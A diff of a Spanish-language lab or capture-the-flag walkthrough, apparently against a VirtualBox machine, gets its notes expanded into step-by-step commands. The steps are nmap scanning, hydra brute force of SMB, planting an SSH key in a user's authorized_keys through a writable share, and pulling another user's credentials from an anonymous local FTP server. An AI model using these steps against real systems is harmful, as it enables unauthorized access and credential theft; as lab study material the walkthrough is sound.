@@ -1,22 +1,51 @@
 User.txt
 
-Hydra al smb:
-hydra -L user.txt -P pass.txt IP smb
+Empezamos verificando que se ha creado una interfaz de red llamada vboxnet0:
+    - ifconfig
 
+Empezamos escaneado la red con nmap:
+    - Descubrir cuantos hosts hay -> nmap 192.168.56.0/24 -sn -T5
+    - Escaneado de todos los puertos -> nmap -p- -sS --min-rate 5000 --open -vvv IP -oN ports 
+    - Escaneo en profundidad de los puertos abiertos -> nmap -p(lista de puestos) -sCV --min-rate 5000 IP (Ej: nmap -p22,80 -sCV --min-rate 5000 IP )
+ 
+Vemos que el servicio smb esta abierto. Probamos hacer un ataque de fuerza bruta a este servicio:
+    - Utilizar los siguientes diccionarios -> ./diccionarios/names.txt y ./diccionarios/passwords.txt 
+
+    - hydra -L names.txt -P passwords.txt IP smb
+
+Y encontramos una credencial valida. Intentamos conectarnos con rdesktop, pero no deja.
+
+Probamos a usar smbmap para ver si hay algun recurso comapartido al que tengamos acceso.
 Ver carpetas compartidas:
-smbmap -H IP -u user -p pass
-smbmap -H IP -u user -p pass -r folder
+    - smbmap -H IP -u user -p pass
+        Vemoc que hay una carpeta llamada folder a la que tenemos acceso de lectura, miramos dentro.
+    - smbmap -H IP -u user -p pass -r folder
 
-Vemos k es el directorio de un usuario y podemos subir archivos.
-creamos un par de claves:
-ssh-keygen
-cat id_rsa.pub > authorized_keys
-smbmap -H IP-u "user" -p "pass" --upload authorized_keys folder/.ssh/authorized_keys
-y entramos por ssh:
-ssh -i id_rsa user@IP
+Parece que es el directorio de un usuario. Miramos si hay cosas interesantes pero no vemos nada.
 
-netstat -a 
-ftp
-open 127.0.0.1 
-get secret.txt
-y tenemos otras credenciales
+Probamos a crear una clave publica y privada para conectarnos por ssh sin necesidad de contraseñas:
+    - ssh-keygen
+    - cat id_rsa.pub > authorized_keys
+    - smbmap -H IP-u "user" -p "pass" --upload authorized_keys folder/.ssh/authorized_keys
+    - ssh -i id_rsa user@IP
+
+Una vez dentro, miramos si hay algo interesante para hacer una escalada de privilegios.
+Miramos los puertos:
+    - netstat -a 
+y vemos que el puerto 21 esta abierto. En este puerto normalmente hay un servidor ftp. 
+Conectarnos al servidor ftp:
+    - ftp
+    - open 127.0.0.1
+nos pide usuario y contraseña, por lo que no podemos porque nos falta la contraseña del usuario.
+
+Probamos a conectarnos con el usuario anonymous, el cual no hace falta usar contraseña:
+    - ftp
+    - open 127.0.0.1, en usuario ponemos anoymous y en la contraseña le damos a enter.
+
+Una vez dentro:
+    - dir o ls 
+    - get file.txt para descargar el fichero.
+    - quit 
+type file.txt y vemos otra credencial de otro usuario. 
+
+Nos conectamos con rdesktop.
